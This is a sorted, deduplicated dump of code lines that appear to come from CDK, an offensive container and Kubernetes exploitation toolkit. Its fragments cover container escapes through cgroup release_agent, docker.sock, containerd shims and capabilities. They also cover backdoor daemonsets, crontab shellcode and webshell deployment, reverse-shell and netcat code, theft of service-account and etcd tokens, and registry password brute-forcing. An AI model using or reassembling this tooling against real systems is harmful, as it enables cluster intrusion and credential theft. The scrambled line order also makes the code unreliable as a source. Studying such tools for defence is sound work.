"errors.CDKRuntimeError{Err: err, CustomMsg: ""mount syscall failed""}"
"errors.CDKRuntimeError{Err: err, CustomMsg: ""read execution result file error""}"
"errors.CDKRuntimeError{Err: err, CustomMsg: ""release_agent is not writable""}"
"errors.CDKRuntimeError{Err: err, CustomMsg: ""rpc error response.""}"
"errors.CDKRuntimeError{Err: err, CustomMsg: ""subgroup cannot be created""}"
"errors.CDKRuntimeError{Err: err, CustomMsg: ""unable to read mountinfo""}"
"errors.CDKRuntimeError{Err: err, CustomMsg: ""write shell exploit failed""}"
"errors.CDKRuntimeError{Err: err, CustomMsg: ""write webshell content failed.""}"
"errors.CDKRuntimeError{Err: err, CustomMsg: fmt.Sprintf(""Execute Shell:%s failed"", command)}"
"errors.CDKRuntimeError{Err: err, CustomMsg: fmt.Sprintf(""fail to create mount dir in:%s"", mountDir)}, """""
"errors.CDKRuntimeError{Err: nil, CustomMsg: ""cannot find suitable subsystem for exploit""}"
"errors.CDKRuntimeError{Err: nil, CustomMsg: ""exploit only suitable for cgroup v1""}"
"errors.CDKRuntimeError{Err: nil, CustomMsg: ""host os does NOT enable unprivileged user namespace.""}"
"errors.CDKRuntimeError{Err: tokenErr, CustomMsg: ""load K8s service account token error.""}"
"errors.CDKRuntimeError{Err: urlErr, CustomMsg: ""err found while searching local K8s apiserver addr.""}"
"escape privileged container via cgroup. usage: ./cdk run mount-cgroup ""shell-cmd-payloads"" [subsystem-name]"
"eval set -- ""$ARGS"""
"exec) <endpoint>/<namespace>/<pod>/<container> <token>"")"
"exim4,ver>=4.87,ver<=4.91"
"expParams := len(pattern.FindAllStringSubmatch(string(expectedStdout), -1))"
"expPayload := """
"expScript := ""/cmd_"" "
"expect := make([]FromTo, 0)"
"expect = append(expect, FromTo{"
"expected: false,"
"expected: true,"
"exploit.ExploitType = ""credential-access"""
"exploit.ExploitType = ""discovery"""
"exploit.ExploitType = ""escaping"""
"exploit.ExploitType = ""persistence"""
"exploit.ExploitType = ""privilege-escalation"""
"exploit.ExploitType = ""remote-control"""
"exploitSubSys := """""
"export CGO_CFLAGS=""-Wno-undef -Wno-deprecated-declarations"""
"ext_url=$(echo ""$EXP"" "
"f, err := os.Open(mountInfoPath)"
"f, err := os.Open(path)"
"f, err := os.OpenFile(path, os.O_WRONLY"
"fbytes, err := ioutil.ReadFile(""/proc/"" "
"fd, err := os.Create(""/bin/sh"")"
"fd, err := unix.Open(ref, unix.O_RDONLY, 0)"
"fd, err = unix.OpenByHandleAt(fd, h, 0)"
"fi, err := os.Stdin.Stat()"
"fieldManager=kubectl-client-side-apply' '{""apiVersion"":""v1"",""kind"":""Pod"",""metadata"":{""annotations"":{""kubectl.kubernetes.io/last-applied-configuration"":""{"
"file, err := os.Open(path)"
"file, err := os.OpenFile(path, os.O_WRONLY"
"file>. Example: ./cdk registry-brute https://index.docker.io/ root,admin /tmp/passwordfile."""
"fileContent, err := kubectl.ServerAccountRequest(opts)"
"fileData, err := ioutil.ReadFile(file)"
"fileInfo, _ := os.Stat(path)"
"fileInfo, err := os.Lstat(FilePath)"
"fileInfo, err := os.Stat(FilePath)"
"fileInfo, err := os.Stat(path)"
"filepath := path.Join(mountPoint, randomeFilename)"
"filepath.Walk(conf.SensitiveFileConf.StartDir, func(path string, info os.FileInfo, err error) error {"
"files, _ := ioutil.ReadDir(path)"
"files, err := ioutil.ReadDir(dir)"
"filterString = """""
"fint, err := strconv.Atoi(f.Name())"
"flag = execAction(args[1], token, args[2])"
"flag = listPods(args[1], token)"
"fmt.Fprintf(os.Stderr, "
"fmt.Fprintf(os.Stdout, string(buf))"
"fmt.Fprintln(fd, """
"fmt.Fprintln(writer, ""TYPE "
"fmt.Fprintln(writer, str)"
"fmt.Printf("""
"fmt.Printf(""%-80s"
"fmt.Printf(""%s"
"fmt.Printf(""%v"
"fmt.Printf(""CapHexParser error: %s"", err)"
"fmt.Printf(""Execute Shell:%s finished with output:"
"fmt.Printf(""Find mounted lxcfs with rw flags, run "
"fmt.Printf(""Running with target: %v, ref: %v"
"fmt.Printf(""["
"fmt.Printf(""error when requesting coreDNS: %s"
"fmt.Printf(""executing command(%s)..."
"fmt.Printf(""final shell exploit is: "
"fmt.Printf(""ipType"
"fmt.Printf(""ipv4"
"fmt.Printf(""ipv6"
"fmt.Printf(""open %s: %s:%d"
"fmt.Printf(""success! device %s was mounted to %s"
"fmt.Printf(BlueBold.Sprint("""
"fmt.Println("""
"fmt.Println(""Critical - Possible Privileged Container Found."")"
"fmt.Println(""Critical - SYS_ADMIN Capability Found. Try 'cdk run rewrite-cgroup-devices/mount-cgroup/...'."")"
"fmt.Println(""Example: cdk run etcd-get-k8s-token anonymous http://172.16.61.10:2379"")"
"fmt.Println(""Example: cdk run kubelet-exec exec https://172.16.61.10:10250/kube-system/test1/test "
"fmt.Println(""Example: cdk run kubelet-exec list http://172.16.61.10:10250"")"
"fmt.Println(""[!] CAP_DAC_READ_SEARCH enabled. You can read files from host. Use 'cdk run cap-dac-read-search' ... for exploitation."")"
"fmt.Println(""[!] CAP_SYS_MODULE enabled. You can escape the container via loading kernel module. More info at https://xcellerator.github.io/posts/docker_escape/."")"
"fmt.Println(""[-] Please provide a payload"")"
"fmt.Println(""[etcd-get-token] run failed:"", err.Error())"
"fmt.Println(""base64 decode failed:"", err.Error())"
"fmt.Println(""err found when reading /proc dir:"", err)"
"fmt.Println(""recover from panic:"", r)"
"fmt.Println(""response data:"", resp)"
"fmt.Println(""skip"", currentPath)"
"fmt.Println(fmt.Sprintf(""[%s] %s"", k, token))"
"fmt.Println(fmt.Sprintf(buffer.String(), defaultRef, defaultTarget, defaultShell))"
"fmt.Println(srv.Target, srv.Port)"
"fok := Args[""evaluate""]"
"for EXP in ""${EXPLOITS[@]}"" ""${EXPLOITS_USERSPACE[@]}"""
"for EXP_TEMP in ""${SORTED_EXPLOITS[@]}"""
"for FEATURE in ""${FEATURES[@]}"""
"for _, a := range addrs {"
"for _, a := range s {"
"for _, apiInstance := range conf.CloudAPI {"
"for _, b := range socks {"
"for _, c := range caps {"
"for _, c := range containers {"
"for _, c := range currentCaps {"
"for _, ci := range cgroupInfos {"
"for _, cmd := range conf.LinuxCommandChecklist {"
"for _, device := range devices {"
"for _, dir := range conf.DefaultPathEnv {"
"for _, env := range os.Environ() {"
"for _, f := range files {"
"for _, f := range pids {"
"for _, file := range files {"
"for _, file := range setuidfiles {"
"for _, filename := range loglist {"
"for _, i := range ifaces {"
"for _, i := range mountInfos {"
"for _, i := range mountedDevs {"
"for _, index := range indexs {"
"for _, info := range infos {"
"for _, item := range addrs {"
"for _, item := range pods {"
"for _, item := range s {"
"for _, j := range i.SuperBlockOptions {"
"for _, k := range kvs {"
"for _, k := range tmplist {"
"for _, kv := range sortedExploits {"
"for _, m := range mounts {"
"for _, match := range matches {"
"for _, matched := range params {"
"for _, mi := range mountInfos {"
"for _, mount := range mountinfo {"
"for _, mountedDir := range mountedDirs {"
"for _, name := range conf.SensitiveFileConf.NameList {"
"for _, name := range dnsNames {"
"for _, opt := range mi.Opts {"
"for _, p := range ps {"
"for _, p := range ps.portRange {"
"for _, password := range passwordList {"
"for _, podName := range matched {"
"for _, port := range strings.Split(s, "","") {"
"for _, proc := range processList {"
"for _, r := range ret {"
"for _, srv := range results {"
"for _, stat := range stats {"
"for _, tt := range tests {"
"for _, username := range usernameList {"
"for _, v := range availSubSyses {"
"for _, v := range cgSyses {"
"for _, v := range cgroupLst {"
"for _, v := range cgroupLstSelf {"
"for _, v := range strings.Split(relStr[:relIdx], ""."") {"
"for _, value := range testCase {"
"for desc, port := range conf.TCPScannerConf.PortList {"
"for i, b := range orig {"
"for i, cache, remain := n-1, rand.Int63(), letterIdxMax"
"for index, line := range lines {"
"for k, v := range conf.ScanFileTextConf.RegexList {"
"for k, v := range kvs {"
"for k, v := range testcase {"
"for key, v := range testGroup {"
"for name, plugin := range Exploits {"
"from lib.conf import CDK, K8S, DEV_PATH"
"from lib.conf import CDK, SELFBUILD_K8S"
"from lib.conf import CDK, SERVER"
"from lib.k8s_remote_action import check_pod_exec, k8s_pod_upload"
"from lib.k8s_selfbuild_action import selfbuild_k8s_pod_upload, check_selfbuild_k8s_pod_exec, k8s_master_ssh_cmd"
"from, _ = strconv.Atoi(fromTo[0])"
"fromImage="""
"fromTo := strings.Split(ip, ""-"")"
"fromTo := strings.Split(port, ""-"")"
"func AllDiskMount() (error, []string) {"
"func ApiServerAddr() (string, error) {"
"func CapDacReadSearchExploit(target, ref string, chroot bool, cmd []string) error {"
"func CapHexParser(capHex string) ([]string, error) {"
"func ContainerdPwn(shellCmd string, rhost string, rport string) error {"
"func DeployBackdoorDaemonset(serverAddr string, tokenPath string, image string, inputArgs string, k8sApp string) bool {"
"func DoRequest(opt EtcdRequestOption) (string, error) {"
"func DockerAPIPull(path string, image string) error {"
"func DockerAPIRun(path string, cmd string) error {"
"func DockerRemoteAPIExploit(api string, cmd string) {"
"func DockerSockExploit(sock string, cmd string) bool {"
"func EscapeCgroup(cmd string, subSystemName string) error {"
"func ExecKubectl(kubectlPath string, args []string) (out string, errStr string) {"
"func ExtractKubectl() (string, error) {"
"func GetAllCGroup() ([]CgroupInfo, error) {"
"func GetAllCGroupSubSystem() ([]string, error) {"
"func GetCgroup(pid int) ([]CgroupInfo, error) {"
"func GetCgroupVersion() (int, error) {"
"func GetGateway() (string, error) {"
"func GetK8sSATokenViaCreatePod(tokenPath string, targetServiceAccount string, rhost string, rport string) error {"
"func GetKernelVersion() ([]int, error) {"
"func GetKeys(content string, silent bool) (map[string]string, error) {"
"func GetMountInfo() ([]MountInfo, error) {"
"func GetServerVersion(serverAddr string) (string, error) {"
"func GetServiceAccountToken(tokenPath string) (string, error) {"
"func GetTaskIPList(ip string) (base string, start, end int, err error) {"
"func GetTaskPortList() ([]FromTo, int) {"
"func GetTaskPortListByString(s string) ([]FromTo, int) {"
"func GetVersion(endpoint string) (string, string, error) {"
"func HttpSendJson(method string, url string, data string) (string, error) {"
"func IntContains(s []int, e int) bool {"
"func MakeDev(major, minor string) int {"
"func MountToRandomTarget(device string) (error, string) {"
"func NewWrapper(writer io.Writer, colorful bool) "
"func PrintItemKey(key string, color bool) {"
"func PrintItemValue(value string, color bool) {"
"func PrintItemValueWithKeyOneLine(key, value string, color bool) {"
"func ProcfsExploit(procDir string, shellPayload string) {"
"func ReadLines(path string) ([]string, error) {"
"func RegisterExploit(name string, exploit ExploitInterface) {"
"func RegisterTask(name string, task TaskInterface) {"
"func RewriteFile(path string, content string, perm os.FileMode) {"
"func RunKubectlCmd(args ...string) (string, error) {"
"func ScanPort(ip string, port int, timeout time.Duration) bool {"
"func SecretToken(tokenPath string) (string, error) {"
"func ServerAccountRequest(opts K8sRequestOption) (string, error) {"
"func StringContains(s []string, e string) bool {"
"func TCPPScan(ipRange string, portRange []FromTo, parallel int64, timeout time.Duration) {"
"func TCPScanToolAPI(ipRange string, portRange string, parallel int64, timeoutMS int) {"
"func UnixHttpSend(method string, unixPath string, uri string, data string) (string, error) {"
"func WriteFile(path string, content string) error {"
"func WriteFileAdd(path string, content string) error {"
"func WriteShellcodeToCrontab(header string, filePath string, shellcode string) error {"
"func checkLogin(url string, username string, password string) bool {"
"func containerdShimApiExp(sock, shellCmd, rhost, rport string) error {"
"func dataFromSliceOrFile(data []byte, file string) ([]byte, error) {"
"func deployK8sCronjob(serverAddr string, tokenPath string, image string, inputArgs string, schedule string) (string, error) {"
"func deployPod(token string, serverAddr string, namespace string, data string) (string, error) {"
"func deployWebShell(scriptType string, path string) error {"
"func dial(network, host string, port int, command bool) {"
"func dumpK8sConfigmapSA(serverAddr string, tokenPath string) string {"
"func dumpK8sPSP(serverAddr string, tokenPath string, anonymous bool) string {"
"func dumpK8sSecretsSA(serverAddr string, tokenPath string) string {"
"func dumpPSPBlockRule(serverAddr string, tokenPath string) {"
"func dumpPodConfig(token string, serverAddr string, podName string, namespace string) (string, error) {"
"func execAction(target, token, cmd string) bool {"
"func fileInode(path string) (inodeID uint64, err error) {"
"func findApiServerPodInMasterNode(token string, serverAddr string) (string, error) {"
"func generateShellExp(hostPath, shellCmd string) (string, string) {"
"func getApiVersion(serverAddr string) (string, error) {"
"func getBackDoorDaemonsetJson(k8sApp string, image string, shellCmd string, apiVersion string) string {"
"func getK8sMitmPayloadDeployJson(image string, port string) string {"
"func getK8sMitmPayloadSvcJson(ip string, port string) string {"
"func getPods(token, endpoint string) (string, error) {"
"func getShimSockets() ([][]byte, error) {"
"func listPods(target, token string) bool {"
"func listen(network, host string, port int, command bool) {"
"func listenPacket(network, host string, port int, command bool) {"
"func logf(f string, v ...interface{}) {"
"func wrapShellCMDWithCrontab(crontab string, shellcmd string, header string) string {"
"gateway, err := util.GetGateway()"
"generic)},ubuntu=10.04{kernel:2.6.32-(21"
"go func(port int, p FromTo) {"
"go io.Copy(os.Stdout, conn)"
"go run -tags=""hw"" ""$project_dir/cmd/cdk/cdk.go"" ""$@"""
"gopath"""
"gops ""github.com/mitchellh/go-ps"""
"gox -os ""linux darwin"" -arch ""386 amd64 arm arm64 mips mips64 mips64le mipsle"" 2>"
"grep alicloud-monitor-controller""]},""initialDelaySeconds"":15,""timeoutSeconds"":15,""periodSeconds"":10,""successThreshold"":1,""failureThreshold"":8},""readinessProbe"":{""exec"":{""command"":[""sh"",""-c"",""ps -ef "
"grep alicloud-monitor-controller""]},""timeoutSeconds"":1,""periodSeconds"":10,""successThreshold"":1,""failureThreshold"":3},""terminationMessagePath"":""/dev/termination-log"",""terminationMessagePolicy"":""File"",""imagePullPolicy"":""IfNotPresent"",""securityContext"":{""capabilities"":{""add"":[""NET_RAW""],""drop"":[""ALL""]},""runAsNonRoot"":true,""readOnlyRootFilesystem"":true}}],""restartPolicy"":""Always"",""terminationGracePeriodSeconds"":30,""dnsPolicy"":""ClusterFirst"",""serviceAccountName"":""admin"",""serviceAccount"":""admin"",""nodeName"":""cn-beijing.192.168.0.155"",""securityContext"":{},""schedulerName"":""default-scheduler"",""tolerations"":[{""key"":""node-role.kubernetes.io/master"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.cloudprovider.kubernetes.io/uninitialized"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/not-ready"",""operator"":""Exists"",""effect"":""NoExecute"",""tolerationSeconds"":300},{""key"":""node.kubernetes.io/unreachable"",""operator"":""Exists"",""effect"":""NoExecute"",""tolerationSeconds"":300}],""priorityClassName"":""system-node-critical"",""priority"":2000001000,""enableServiceLinks"":true},""status"":{""phase"":""Running"",""conditions"":[{""type"":""Initialized"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:44Z""},{""type"":""Ready"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:13:04Z""},{""type"":""ContainersReady"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:13:04Z""},{""type"":""PodScheduled"",""status"":""True"",""lastProbeTime"":null,""lastTransitionTime"":""2020-04-08T04:12:44Z""}],""hostIP"":""192.168.0.155"",""podIP"":""172.20.0.196"",""podIPs"":[{""ip"":""172.20.0.196""}],""startTime"":""2020-04-08T04:12:44Z"",""containerStatuses"":[{""name"":""alicloud-monitor-controller"",""state"":{""running"":{""startedAt"":""2020-04-08T04:13:03Z""}},""lastState"":{},""ready"":true,""restartCount"":0,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/alicloud-monitor-controller:v1.1.0"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/alicloud-monitor-controller@sha256:62b7e69c72b8e0d895ca7006c55cd3a053e664d071955fdafe374dbf61105f52"",""containerID"":""docker://09d089725237d30a38e2058da1fd8b6dbc671ddb61997b0b04af19907b82e7e1"",""started"":true}],""qosClass"":""Burstable""}},{""metadata"":{""name"":""aliyun-acr-credential-helper-6b4f98fdfb-ndzlt"",""generateName"":""aliyun-acr-credential-helper-6b4f98fdfb-"",""namespace"":""kube-system"",""selfLink"":""/api/v1/namespaces/kube-system/pods/aliyun-acr-credential-helper-6b4f98fdfb-ndzlt"",""uid"":""de9e98a0-2c72-4ef3-81d1-22e8afa38846"",""resourceVersion"":""2084"",""creationTimestamp"":""2020-04-08T04:12:31Z"",""labels"":{""app"":""aliyun-acr-credential-helper"",""pod-template-hash"":""6b4f98fdfb""},""annotations"":{""kubernetes.io/psp"":""ack.privileged""},""ownerReferences"":[{""apiVersion"":""apps/v1"",""kind"":""ReplicaSet"",""name"":""aliyun-acr-credential-helper-6b4f98fdfb"",""uid"":""cf48a7f1-93f4-42f6-900b-aecf853279e5"",""controller"":true,""blockOwnerDeletion"":true}]},""spec"":{""volumes"":[{""name"":""localtime"",""hostPath"":{""path"":""/etc/localtime"",""type"":""File""}},{""name"":""aliyun-acr-credential-helper-token-jlc5m"",""secret"":{""secretName"":""aliyun-acr-credential-helper-token-jlc5m"",""defaultMode"":420}}],""containers"":[{""name"":""aliyun-acr-credential-helper"",""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/aliyun-acr-credential-helper:v20.03.16.0-36d5d7e-aliyun"",""env"":[{""name"":""POD_NAME"",""valueFrom"":{""fieldRef"":{""apiVersion"":""v1"",""fieldPath"":""metadata.name""}}},{""name"":""POD_NAMESPACE"",""valueFrom"":{""fieldRef"":{""apiVersion"":""v1"",""fieldPath"":""metadata.namespace""}}}],""resources"":{""limits"":{""cpu"":""500m"",""memory"":""500Mi""},""requests"":{""cpu"":""50m"",""memory"":""50Mi""}},""volumeMounts"":[{""name"":""localtime"",""readOnly"":true,""mountPath"":""/etc/localtime"
"h := unix.NewFileHandle(1, []byte{0x02, 0, 0, 0, 0, 0, 0, 0})"
"hID, err := strconv.Atoi(singleCG[0])"
"handle, _ := os.OpenFile(""/proc/"""
"hasUpper := strings.Contains(j, ""upperdir="")"
"host, port := os.Getenv(""KUBERNETES_SERVICE_HOST""), os.Getenv(""KUBERNETES_SERVICE_PORT"")"
"hostname, err := os.Hostname()"
"href=""(."
"href=""pods/"
"i, err := strconv.ParseInt(s, 10, 64)"
"if !bytes.Contains(buf.Bytes(), []byte(tt.successStr)) {"
"if !strings.Contains(json, ""--allow-privileged"") {"
"if !strings.Contains(json, ""--authorization-mode"") {"
"if !strings.Contains(json, ""--secure-port"") {"
"if !strings.Contains(mi.MountPoint, filter) {"
"if !strings.Contains(resp, ""selfLink"") "
"if !strings.Contains(resp, ""selfLink"") {"
"if !util.IntContains(MaybeSuccessfulStatuscodeList, resp.StatusCode) {"
"if !util.StringContains(availSubSys, subSysName) {"
"if !util.StringContains(capability.DockerDefaultCaps, c) {"
"if !util.StringContains(sLst, v.OriginalInfo) {"
"if Args[""--full""].(bool) {"
"if Args[""--list""].(bool) {"
"if Args[""<tool>""] != nil {"
"if Args[""auto-escape""].(bool) {"
"if Args[""run""].(bool) {"
"if ScanPort(ip, port, ps.timeout) {"
"if [ ""$opt_checksec_mode"" = ""true"" ]"
"if [ ""$opt_cvelist_file"" = ""true"" ]"
"if [ ""$opt_kernel_only"" = ""true"" -o -z ""$PKG_LIST"" ]"
"if [ ""$opt_kernel_version"" == ""true"" ]"
"if [ ""$opt_summary"" = ""true"" ]"
"if [ ""$opt_userspace_only"" = ""true"" ]"
"if [ $opt_fetch_bins = ""true"" ]"
"if [ $opt_fetch_srcs = ""true"" ]"
"if [ -n ""$PKGLIST_FILE"" -a -n ""$PKG_LIST"" ]"
"if [ -n ""$analysis_url"" ]"
"if [ -z ""$CONFIG"" ]"
"if [ -z ""$KCONFIG"" -a ""$ENABLE_REQS_NUM"" = 0 ]"
"if _, exists := distinctMap[item]"
"if _, ok := matchset[sockname]"
"if _, ok := temp[item]"
"if args[0] == ""default"" {"
"if args[0] == ""reverse"" {"
"if cgroupInfos, err := util.GetCgroup(1)"
"if checkLogin(v2URL, username, password) {"
"if ci.CgroupPath == ""/"" "
"if cli.Args[""<args>""] != nil {"
"if content, err = ioutil.ReadFile(fmt.Sprintf(""./%s"", target))"
"if devicesAllowPath == """" {"
"if err := os.Mkdir(deviceCGroupPath, os.ModePerm)"
"if err = unix.Chroot(""."")"
"if escaping.DockerSockExploit(""/var/run/docker.sock"", crontabCMD) {"
"if hijackCommand == ""nil"" {"
"if i.Fstype == ""overlay"" "
"if k.Get(""value"").Exists() {"
"if key == ""/"" {"
"if len(cli.Args[""<args>""].([]string)) != 1 {"
"if len(connectString) == 0 { //valid input: ""192.168.0.23:2233"""
"if m.Device == ""lxcfs"" "
"if m.Major == """" {"
"if mi.Device == ""lxcfs"" "
"if mount.Root == ""/var/log"" {"
"if mountPoint == """" {"
"if opt == ""rw"" {"
"if opts.Method == ""POST"" {"
"if opts.Server == """" {"
"if opts.Token == """" {"
"if os.Args[1] == ""nc"" {"
"if os.Getenv(""GOTRACEBACK"") != ""crash"" {"
"if persistence.DeployBackdoorDaemonset(addr, tokenPath, ""alpine:latest"", crontabCMD, ""kube-proxy"") {"
"if port == ""8080"" "
"if stat, ok := info.Sys().("
"if stat, ok := sys.("
"if string(data) == ""0"" {"
"if strings.Contains(ans, ""ContainersRunning"") {"
"if strings.Contains(body, ""Containers"") {"
"if strings.Contains(currentPath, name) {"
"if strings.Contains(devicesAllow, ""a "
"if strings.Contains(err.Error(), ""no such file or directory"") {"
"if strings.Contains(err.Error(), ""too many open files"") {"
"if strings.Contains(fmt.Sprintln(err), ""close exec fds: open /proc/self/fd"") {"
"if strings.Contains(fstring, ""runc"") "
"if strings.Contains(line, ""[CVE"") {"
"if strings.Contains(m.Device, ""/"") "
"if strings.Contains(matched, ""3fffffffff"") {"
"if strings.Contains(r.String(), apiInstance.ResponseMatch) {"
"if strings.Contains(resp, "
"if strings.Contains(resp, ""/api"") {"
"if strings.Contains(respText, logPageSubString) {"
"if strings.Contains(result.Header.XEnvoyPeerMetadataId, ""sidecar"") {"
"if strings.Contains(string(data), ""/systemd/"") "
"if strings.Contains(v, """
"if strings.HasPrefix(config.Network, udpNetwork) {"
"if strings.HasPrefix(k, k8sTokenPath) {"
"if strings.HasPrefix(line, ""Cap"") {"
"if strings.HasPrefix(shellPath, ""/"") {"
"if strings.TrimSpace(string(data)) == ""1"" {"
"if strings.TrimSuffix(string(data), """
"if target == ""/"" {"
"if token != """" {"
"if token == """" {"
"if tokenPath != """" {"
"if v, ok := res[k]"
"if v.CgroupPath == ""/"" {"
"ifaces, err := net.Interfaces()"
"iid, err := fileInode(path)"
"import ""github.com/cdk-team/CDK/conf"""
"import ""time"""
"indexs := make([]int, 0)"
"indexs = append(indexs, index)"
"info, err := os.Stat(path)"
"info, err := shimClient.Create(ctx, "
"infos, _ := disk.Partitions(false)"
"inodeID, err := fileInode(""/sys/fs/cgroup/devices/devices.allow"")"
"inputList = strings.Split(input, "","")"
"inputList, err := util.ReadLines(input)"
"io.Copy(buf, response.Body)"
"io.Copy(conn, bytes.NewReader(buffer))"
"io.Copy(conn, os.Stdin)"
"io.Copy(os.Stdout, c)"
"io.WriteString(conn, input.Text()"
"ip := fmt.Sprintf(""10.%d.%d.%d"", rand.Intn(256), rand.Intn(256), rand.Intn(256))"
"ipRange:   ipRange,"
"ips := make([]string, 100)"
"json = argInsertReg.ReplaceAllString(json, "
"json = reg.ReplaceAllString(json, ""${1}${3}"")"
"json = reg.ReplaceAllString(json, ""${1}9444${3}"")"
"json = reg.ReplaceAllString(json, ""${1}AlwaysAllow${3}"")"
"json = reg.ReplaceAllString(json, ""${1}true${3}"")"
"json, _ = sjson.Delete(json, ""metadata.annotations"")"
"json, _ = sjson.Delete(json, ""metadata.creationTimestamp"")"
"json, _ = sjson.Delete(json, ""metadata.resourceVersion"")"
"json, _ = sjson.Delete(json, ""metadata.selfLink"")"
"json, _ = sjson.Delete(json, ""metadata.uid"")"
"json, _ = sjson.Delete(json, ""spec.tolerations"")"
"json, _ = sjson.Delete(json, ""status"")"
"json, _ = sjson.Set(json, ""metadata.labels.component"", gjson.Get(json, ""metadata.labels.component"").String()"
"json, _ = sjson.Set(json, ""metadata.name"", podName)"
"json:""X-Amzn-Trace-Id"""
"json:""X-B3-Sampled"""
"json:""X-B3-Spanid"""
"json:""X-B3-Traceid"""
"json:""X-Envoy-Attempt-Count"""
"json:""X-Envoy-Peer-Metadata"""
"json:""X-Envoy-Peer-Metadata-Id"""
"json:""affinity"""
"json:""annotations,omitempty"""
"json:""apiVersion"""
"json:""blockOwnerDeletion"""
"json:""conditions"""
"json:""containerID"""
"json:""containerPort"""
"json:""containerStatuses"""
"json:""containers"""
"json:""controller"""
"json:""creationTimestamp,omitempty"""
"json:""dnsPolicy"""
"json:""effect"""
"json:""env"""
"json:""exitCode"""
"json:""fieldsType"""
"json:""fieldsV1"""
"json:""generateName"""
"json:""generateName,omitempty"""
"json:""headers"""
"json:""hostIP"""
"json:""hostPort"""
"json:""image"""
"json:""imageID"""
"json:""ip"""
"json:""items"""
"json:""key"""
"json:""kind"""
"json:""labels"""
"json:""labels,omitempty"""
"json:""lastProbeTime"""
"json:""lastState"""
"json:""lastTransitionTime"""
"json:""managedFields"""
"json:""manager"""
"json:""matchFields"""
"json:""metadata"""
"json:""name"""
"json:""name,omitempty"""
"json:""namespace,omitempty"""
"json:""nodeAffinity"""
"json:""nodeName"""
"json:""nodeSelectorTerms"""
"json:""operation"""
"json:""operator"""
"json:""ownerReferences"""
"json:""phase"""
"json:""podIP"""
"json:""podIPs"""
"json:""ports"""
"json:""protocol"""
"json:""qosClass"""
"json:""ready"""
"json:""reason"""
"json:""requiredDuringSchedulingIgnoredDuringExecution"""
"json:""resourceVersion,omitempty"""
"json:""resources"""
"json:""restartCount"""
"json:""restartPolicy"""
"json:""running,omitempty"""
"json:""schedulerName"""
"json:""securityContext"""
"json:""serviceAccountName"""
"json:""spec"""
"json:""startTime"""
"json:""started"""
"json:""startedAt"""
"json:""state"""
"json:""status"""
"json:""sysctls"""
"json:""terminated,omitempty"""
"json:""terminationGracePeriodSeconds"""
"json:""time"""
"json:""tolerationSeconds,omitempty"""
"json:""tolerations"""
"json:""type"""
"json:""uid"""
"json:""uid,omitempty"""
"json:""value"""
"json:""values"""
"json:""waiting,omitempty"""
"jsp) <filepath>."""
"jsp) <filepath>."")"
"k8sBackdoorDaemonsetJson = strings.Replace(k8sBackdoorDaemonsetJson, ""${API_VERSION}"", apiVersion, -1)"
"k8sBackdoorDaemonsetJson = strings.Replace(k8sBackdoorDaemonsetJson, ""${IMAGE}"", image, -1)"
"k8sBackdoorDaemonsetJson = strings.Replace(k8sBackdoorDaemonsetJson, ""${K8S_APP}"", k8sApp, -1)"
"k8sBackdoorDaemonsetJson = strings.Replace(k8sBackdoorDaemonsetJson, ""${SHELL_CMD}"", shellCmd, -1)"
"k8sDaemonsetApi = strings.Replace(k8sDaemonsetApi, ""${API_VERSION}"", apiVersion, -1)"
"keys, err := etcdctl.GetKeys(resp, opt.Silent)"
"kubectlPath := filepath.Join(tmpDir, ""kubectl"")"
"kubeletEndpoint := fmt.Sprintf(""https://%s:10250/"", gateway)"
"kubernetes.io/service-account-token"") {"
"kversion, _ := host.KernelVersion()"
"kvs := gjson.Get(content, ""kvs"").Array()"
"kvs, err := etcdctl.GetKeys(resp1, opt.Silent)"
"l, err := f.Write([]byte(""a""))"
"l.PrintFunc(temp, v...)"
"letterBytes   = ""abcde1fghij2klmno3pqrst4uvwxy5zABCD6EFGHI7JKLMN8OPQRS9TUVWX9YZ"""
"letterIdxMask = 1<<letterIdxBits - 1 // All 1-bits, as many as letterIdxBits"
"libc6,ver<2.27,CONFIG_USER_NS=y,sysctl:kernel.unprivileged_userns_clone==1,x86_64"
"libc6,ver<=2.25,x86"
"libc6,ver<=2.25,x86_64"
"libc6,x86"
"line, err := r.ReadString('"
"lines := strings.Split(string(output), """
"lines = append(lines, scanner.Text())"
"link := fmt.Sprintf(""/%s/%s/%s"", namespace, pod, container)"
"listen(config.Network, config.Host, config.Port, config.Command)"
"listenAddr := net.JoinHostPort(host, strconv.Itoa(port))"
"listenPacket(config.Network, config.Host, config.Port, config.Command)"
"listener, err := net.Listen(network, listenAddr)"
"localBundlePath := fmt.Sprintf(""/cdk_%s"", util.RandString(6))"
"lock:      semaphore.NewWeighted(parallel),"
"log.Fatal(""example: cdk probe 192.168.1.0-255 22,80,100-110 50 1000"")"
"log.Fatal(""example: cdk run mount-procfs /mnt/host_proc "
"log.Fatal(""fail to connect remote addr: "", connectString)"
"log.Fatal(""failed to find docker devicemapper abs path in /proc/self/mounts"")"
"log.Fatal(""get process list failed."")"
"log.Fatal(""if you see "
"log.Fatal(""invalid input args, Example: ./cdk dcurl get http://127.0.0.1:2375/info "
"log.Fatal(""invalid input args, Example: ./cdk ucurl get /var/run/docker.sock http://127.0.0.1/info "
"log.Fatal(""invalid reverse shell remote addr: "", connectString)"
"log.Fatal(""overwrite file:"", path, ""err: """
"log.Fatal(""run command error :"" "
"log.Fatal(""set GOTRACEBACK env failed:"", err)"
"log.Fatalf(""%s read error, %v"", input, err)"
"log.Fatalf(""[-] Chroot: %v"
"log.Fatalf(""[-] Fchdir: %v"
"log.Fatalf(""[-] Open: %v"
"log.Fatalf(""[-] OpenByHandleAt: %v"
"log.Fatalf(""[-] Run cmd: %s"
"log.Fatalf(""[-] read file: %s"
"log.Fatalf(""cannot fetch http://httpbin.org/get , get err: %v"", err)"
"log.Fatalf(""respone error: %s"", string(bodyBytes))"
"log.Fatalf(""the shell is not in a istio(service mesh) network."")"
"log.Fatalln(""Invalid Docker Remote API: "" "
"log.Fatalln(""docopt err: "", err)"
"log.Print(fmt.Errorf(""localAddresses: %v"
"log.Printf("""
"log.Printf(""%s"
"log.Printf(""%s: %s"", key, GreenBold.Sprint(value))"
